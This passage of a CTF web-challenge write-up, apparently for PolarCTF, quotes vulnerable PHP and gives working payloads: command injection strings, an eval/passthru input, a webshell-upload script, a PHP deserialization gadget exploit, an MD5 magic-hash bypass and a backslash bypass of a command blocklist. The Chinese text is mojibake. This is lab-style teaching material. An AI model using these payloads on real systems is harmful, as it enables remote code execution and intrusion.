operator">==</span> <span class="token string single-quoted-string">'www.polarctf.com'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag\.php/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"don't show flag!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 2 '</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$result</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å…¶å®å¾ˆç®€å•ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p><strong>parse_str()</strong> å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>www<span class="token operator">.</span>polarctf<span class="token operator">.</span>com<span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> f<span class="token operator">*</span></code></pre><h4 id="cool"><a href="#cool" class="headerlink" title="cool"></a>cool</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ä¸ç†è§£ is_numeric çš„æ„ä¹‰</p><p>Payload: <code>?a=passthru(&#39;tac f*&#39;);</code></p><h4 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sandBox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandBox</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandBox</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$sandBox</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸Šä¼ æ–‡ä»¶å: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ç±»å‹: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶å¤§å°: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sandBox</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><ol><li><p>1.<code>$sandBox = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</code>è¿™è¡Œä»£ç é€šè¿‡MD5å“ˆå¸Œå‡½æ•°å¤„ç†ç”¨æˆ·çš„IPåœ°å€ï¼ˆ<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>ï¼‰ï¼Œç”Ÿæˆä¸€ä¸ª32ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²å°†ç”¨ä½œç›®å½•åã€‚</p></li><li><p>2.<code>if(!is_dir($sandBox))&#123;</code>è¿™è¡Œä»£ç æ£€æŸ¥ç”±MD5å“ˆå¸Œç”Ÿæˆçš„ç›®å½•åæ˜¯å¦å·²å­˜åœ¨ã€‚<code>is_dir()</code>å‡½æ•°ç”¨äºæ£€æŸ¥æŒ‡å®šè·¯å¾„æ˜¯å¦ä¸ºç›®å½•ã€‚å¦‚æœä¸æ˜¯ç›®å½•ï¼ˆå³ä¸å­˜åœ¨ï¼‰ï¼Œåˆ™æ‰§è¡Œæ¥ä¸‹æ¥çš„ä»£ç ã€‚</p></li><li><p>3.<code>mkdir($sandBox,0755,true);</code>å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œ<code>mkdir()</code>å‡½æ•°å°†åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ã€‚æƒé™è®¾ç½®ä¸º<code>0755</code>ï¼ˆå³æ‰€æœ‰è€…æœ‰è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ï¼Œç»„å’Œå…¶ä»–ç”¨æˆ·æœ‰è¯»å’Œæ‰§è¡Œæƒé™ï¼‰ã€‚<code>true</code>å‚æ•°è¡¨ç¤ºåˆ›å»ºå¤šçº§ç›®å½•ï¼Œå¦‚æœä¸­é—´çš„æŸä¸ªç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿä¼šä¸€å¹¶åˆ›å»ºã€‚</p></li><li><p>4.<code>if($_FILES)&#123;</code>è¿™è¡Œä»£ç æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ã€‚<code>$_FILES</code>æ˜¯ä¸€ä¸ªå…¨å±€æ•°ç»„ï¼ŒåŒ…å«äº†é€šè¿‡HTTP POSTä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ã€‚</p></li><li><p>5.<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name],$sandBox.&quot;/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);</code>å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œ<code>move_uploaded_file()</code>å‡½æ•°å°†ä¸Šä¼ çš„æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç”±MD5å“ˆå¸Œç”Ÿæˆçš„ç›®å½•ä¸­ã€‚<code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>æ˜¯ä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶æ–‡ä»¶åï¼Œ<code>$sandBox.&quot;/&quot;.&quot;$_FILES[&quot;file&quot;][&quot;name&quot;]</code>æ˜¯ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼Œå³æ–°åˆ›å»ºçš„ç›®å½•åŠ ä¸ŠåŸå§‹æ–‡ä»¶åã€‚</p></li><li><p>6.<code>echo &quot;ä¸Šä¼ æ–‡ä»¶å: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</code>è¾“å‡ºä¸Šä¼ æ–‡ä»¶çš„åç§°ã€‚</p></li><li><p>7.<code>echo &quot;æ–‡ä»¶ç±»å‹: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</code>è¾“å‡ºä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹ã€‚</p></li><li><p>8.<code>echo &quot;æ–‡ä»¶å¤§å°: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</code>è¾“å‡ºä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä»å­—èŠ‚è½¬æ¢ä¸ºåƒå­—èŠ‚ï¼ˆKBï¼‰ã€‚</p></li><li><p>9.<code>echo $sandBox;</code>è¾“å‡ºåˆ›å»ºçš„ç›®å½•åã€‚</p></li></ol><p>æ‰‹åŠ¨ä¸Šä¼ ä¸ªé©¬å­ ç„¶årceå°±è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://07f244aa-014e-4336-95be-997f5f132778.www.polarctf.com:8090/"</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D:/CTF/upload/1.php'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token builtin">file</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Upload failed"</span><span class="token punctuation">)</span></code></pre><h4 id="è¦†ç›–"><a href="#è¦†ç›–" class="headerlink" title="è¦†ç›–"></a>è¦†ç›–</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"www.baidu.com"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'www.polarctf.com'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 2 '</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$result</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å…¶å®å¾ˆç®€å•ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>ï¼Ÿ é¢˜ä¸€ç‚¹å„¿æ²¡æ”¹</p><h4 id="PHPååºåˆ—åŒ–åˆè¯•"><a href="#PHPååºåˆ—åŒ–åˆè¯•" class="headerlink" title="PHPååºåˆ—åŒ–åˆè¯•"></a>PHPååºåˆ—åŒ–åˆè¯•</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$env</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">env</span><span class="token operator">=</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">env</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'easy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'easy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Expï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$env</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Easy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">-></span><span class="token property">evil</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac f1@g.php'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="æœºå™¨äºº"><a href="#æœºå™¨äºº" class="headerlink" title="æœºå™¨äºº"></a>æœºå™¨äºº</h4><p>è®¿é—®<code>robots.txt</code>å¾—åˆ°å‰åŠæ®µflagå’Œæ•æ„Ÿç›®å½•  ä½†æ˜¯è¦è‡ªå·±è¡¥ä¸ªflag.php æ²¡è§è¿‡</p><h4 id="æ‰«æ‰«çœ‹"><a href="#æ‰«æ‰«çœ‹" class="headerlink" title="æ‰«æ‰«çœ‹"></a>æ‰«æ‰«çœ‹</h4><p>SignIn</p><h4 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h4><p>flagè—åœ¨cookieé‡Œé¢</p><h4 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h4><pre class="language-php" data-language="php"><code class="language-php">no no no! <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xxs'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xxs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é”™è¯¯ï¼šè¾“å…¥ç±»å‹ä¸å…è®¸ä¸ºæ•°ç»„ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^0e[0-9]+$/"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é”™è¯¯ï¼šè¾“å…¥çš„MD5å€¼å¿…é¡»ä»¥'0e'å¼€å¤´ï¼Œå¹¶è·Ÿéšæ•°å­—ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é”™è¯¯ï¼šè¾“å…¥å¿…é¡»æ˜¯æ•°å­—ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ­å–œï¼š"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é”™è¯¯ï¼šå¿…é¡»è®¾ç½®æ­£ç¡®å‚æ•°ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>é”™è¯¯ï¼šå¿…é¡»è®¾ç½®æ­£ç¡®å‚æ•°ã€‚</code></pre><p>æ²¡æ„æ€<code>?xxs=240610708</code></p><h4 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h4><p>åŸé¢˜ æ²¡æ„æ€</p><h4 id="rapyiquan-åæ–œæ "><a href="#rapyiquan-åæ–œæ " class="headerlink" title="rapyiquan(åæ–œæ  \)"></a>rapyiquan(åæ–œæ  <code>\</code>)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">checkUrlParams</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkUrlParams</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_md'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"badly!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hack"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åæ–œæ ç»•è¿‡  sortè¾“å‡ºå‡½æ•°ä¹Ÿå¯ä»¥</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token punctuation">[</span>md<span class="token operator">=</span>ta\c <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span 